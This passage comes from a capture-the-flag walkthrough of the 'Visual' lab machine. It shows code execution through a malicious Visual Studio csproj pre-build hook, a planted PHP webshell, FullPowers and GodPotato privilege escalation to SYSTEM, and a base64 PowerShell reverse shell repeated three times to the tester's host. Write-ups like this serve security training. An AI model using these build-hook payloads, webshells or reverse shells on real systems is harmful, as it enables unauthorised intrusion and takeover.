13:59:01.658623 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 14, length 40
13:59:01.658638 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 14, length 40
13:59:02.673184 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 15, length 40
13:59:02.673211 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 15, length 40
13:59:03.689172 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 16, length 40
13:59:03.689197 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 16, length 40

```

And then it shows success:

![image-20240221135924809](https://0xdf.gitlab.io/img/image-20240221135924809.png)

#### Copy RCE Project

It turns out that the author of this box also has a repo on Github called [vs-rce](https://github.com/CsEnox/vs-rce) that’s been up since before Visual’s release. It’s a simple VS project:

![image-20240221140039883](https://0xdf.gitlab.io/img/image-20240221140039883.png)

In `rce`, the `Program.cs` is the default Hello World. The `rce.csproj` has the trigger (done slightly more simply than I showed):

```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <PreBuildEvent>calc.exe</PreBuildEvent>
  </PropertyGroup>

</Project>

```

In my Gitea instance, I’ll select “New Migration”:

![image-20240221140159613](https://0xdf.gitlab.io/img/image-20240221140159613.png)

I’ll select GitHub, and on the next page git it the URL for this repo. It copies the repo into Gitea:

![image-20240221140246083](https://0xdf.gitlab.io/img/image-20240221140246083.png)

I’ll edit the `rce.csproj` file to replace `calc.exe` with `ping 10.10.14.6`:

![image-20240221140324202](https://0xdf.gitlab.io/img/image-20240221140324202.png)

I’ll save and commit that, and then submit the URL for this repo to Visual. After a minute or so, there’s ICMP packets:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:04:52.304056 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 17, length 40
14:04:52.304089 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 17, length 40
14:04:53.312126 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 18, length 40
14:04:53.312151 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 18, length 40
14:04:54.326953 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 19, length 40
14:04:54.326978 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 19, length 40
14:04:55.342651 IP 10.10.11.234 > 10.10.14.6: ICMP echo request, id 1, seq 20, length 40
14:04:55.342669 IP 10.10.14.6 > 10.10.11.234: ICMP echo reply, id 1, seq 20, length 40

```

### Shell

To get a shell, I’ll update the `HelloLinux.csproj` file, replacing the `ping` with a PowerShell one-liner (PowerShell #3 (Base64) from [https://www.revshells.com/](https://0xdf.gitlab.io//2024/02/24/revshells.com)):

```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" />
  </Target>

</Project>

```

I’ll add and commit that to git, and the push to Gitea and resubmit to Visual. Eventually, I get a shell at `nc`:

```
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.234 49698

PS C:\Windows\Temp\acd49d47976809051b1f24cba31553> whoami
visual\enox

```

I can get the user flag:

```
PS C:\users\enox\desktop> type user.txt
11d634b6************************

```

## Shell as local service

### Enumeration

The host is relatively empty. The only other interesting thing in the enox user’s home directory is `compile.ps1`, which seems like it handles the compilation for the website. It reads a list of submissions to compile from a text file:

```
$todofile="C:\\xampp\htdocs\uploads\todo.txt"

```

It then loops through that file, processing and compiling with `msbuild.exe` and updating the `todo.txt` file.

This isn’t useful for a next step on it’s own, but it does show that enox can read and write within at least part of the `xampp` directories.

### Webshell

#### Write POC

The `C:\xampp\htdocs` directory is the root of the webserver:

```
PS C:\xampp\htdocs> ls

    Directory: C:\xampp\htdocs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/10/2023  10:32 AM                assets
d-----        6/10/2023  10:32 AM                css
d-----        6/10/2023  10:32 AM                js
d-----        2/21/2024  11:17 AM                uploads
-a----        6/10/2023   6:20 PM           7534 index.php
-a----        6/10/2023   4:17 PM           1554 submit.php
-a----        6/10/2023   4:11 PM           4970 vs_status.php

```

I’ll try writing a PHP file there:

```
PS C:\xampp\htdocs> Set-Content -path 0xdf.php -Value '<?php phpinfo(); ?>'

```

It works:

![image-20240221142544303](https://0xdf.gitlab.io/img/image-20240221142544303.png)

It’s worth noting that PowerShell is weird about encoding if I use `echo`. For example:

```
PS C:\xampp\htdocs> echo '<?php phpinfo(); ?>' > fail.php

```

This will not work because it writes 16-bit characters (as can be seen in the site of the files):

```
PS C:\xampp\htdocs> ls

    Directory: C:\xampp\htdocs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/10/2023  10:32 AM                assets
d-----        6/10/2023  10:32 AM                css
d-----        6/10/2023  10:32 AM                js
d-----        2/21/2024  11:17 AM                uploads
-a----        2/21/2024  11:24 AM             21 0xdf.php
-a----        2/21/2024  11:26 AM             44 fail.php
-a----        6/10/2023   6:20 PM           7534 index.php
-a----        6/10/2023   4:17 PM           1554 submit.php
-a----        6/10/2023   4:11 PM           4970 vs_status.php

```

`fail.php` is twice the size of `0xdf.php`, despite the content looking the same. I can also see this by fetching `fail.php` from the webserver:

```
oxdf@hacky$ curl -s 10.10.11.234/fail.php -o- | xxd
00000000: fffe 3c00 3f00 7000 6800 7000 2000 7000  ..<.?.p.h.p. .p.
00000010: 6800 7000 6900 6e00 6600 6f00 2800 2900  h.p.i.n.f.o.(.).
00000020: 3b00 2000 3f00 3e00 0d00 0a00            ;. .?.>.....

```

The encoding is causing XAMPP to not run it as PHP.

#### Webshell / Shell

I’ll update `0xdf.php` to a PHP webshell:

```
PS C:\xampp\htdocs> Set-Content -path 0xdf.php -Value '<?php system($_REQUEST["cmd"]); ?>'

```

The site is running as nt authority\\local service:

![image-20240221143550409](https://0xdf.gitlab.io/img/image-20240221143550409.png)

I’ll replace `whoami` with the reverse shell from above, and on hitting enter, there’s a shell at `nc`:

```
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.234 49699

PS C:\xampp\htdocs> whoami
nt authority\local service

```

## Shell as system

### Enumeration

I would expect local service to have some privileges, but it seems that they have been stripped away:

```
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

### Recover SeImpresonate

#### Strategy

When Windows starts a service as local service or network service, the service starts with a reduced set of privileges that might be available to that user. A researcher found that if a scheduled tasks is started as one of those users, the full set of privileges comes with it, including `SeImpersonate`.

A tool, [FullPowers](https://github.com/itm4n/FullPowers) automates that process. There’s a compiled `.exe` on the [release page](https://github.com/itm4n/FullPowers/releases/tag/v0.1).

#### Execute

I’ll download the executable to my host, and serve it with a Python web server. I’ll fetch it with `wget` on Visual:

```
PS C:\programdata> wget 10.10.14.6/FullPowers.exe -outfile FullPowers.exe

```

If I just run this, it seems to work, but then doesn’t:

```
PS C:\programdata> .\FullPowers.exe
[+] Started dummy thread with id 2076
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
PS C:\programdata>

```

That’s because of how my reverse shell is running. It’s doing a loop to run commands, return the result, and then wait. In this case, it runs `FullPowers.exe`, which results in a new prompt, but then that exits and it drops back to my original prompt without the new powers.

If I give it `whoami /priv`, it confirms that it is working:

```
PS C:\programdata> .\FullPowers.exe -c "whoami /priv"
[+] Started dummy thread with id 2328
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

```

There’s a bunch more privileges there, including `SeImpersonate`.

I’ll give it the same reverse shell again:

```
PS C:\programdata> .\FullPowers.exe -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

```

It hangs, but at `nc`:

```
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.234 49708

PS C:\Windows\system32>

```

And this shell has `SeImpersonate`:

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

```

### Potato

I’ve shown many Potato exploits over the years. Microsoft keeps trying to block ways to use `SeImpersonate` to get a system shell, and researchers keep finding new ways. The current popular exploit is [GodPotato](https://github.com/BeichenDream/GodPotato).

I’ll download the (latest release\](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe) to my host, and serve it with a Python web server. From Visual, I’ll fetch it:

```
PS C:\programdata> wget 10.10.14.6/GodPotato-NET4.exe -outfile gp.exe

```

Running it without args gives the usage, and running the example shows it gets system:

```
PS C:\programdata> .\gp.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140715322900480
[*] DispatchTable: 0x140715325206640
[*] UseProtseqFunction: 0x140715324582816
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\072a5030-acb7-4e49-bd61-f21fe7ca2b09\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00006c02-12b0-ffff-cbf0-93d7ee1fce8a
[*] DCOM obj OXID: 0xdd2bb902652bc07
[*] DCOM obj OID: 0x89cf102b060e442b
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 872 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1672
nt authority\system

```

I’ll get a reverse shell and run it:

```
PS C:\programdata> .\gp.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

```

It just hangs, but at `nc`:

```
oxdf@hacky$ rlwrap -cAr nc -lnvp 445
Listening on 0.0.0.0 445
Connection received on 10.10.11.234 49716

PS C:\programdata> whoami
nt authority\system

```

And I can grab the flag:

```
PS C:\users\administrator\desktop> type root.txt
e3563d96************************

```





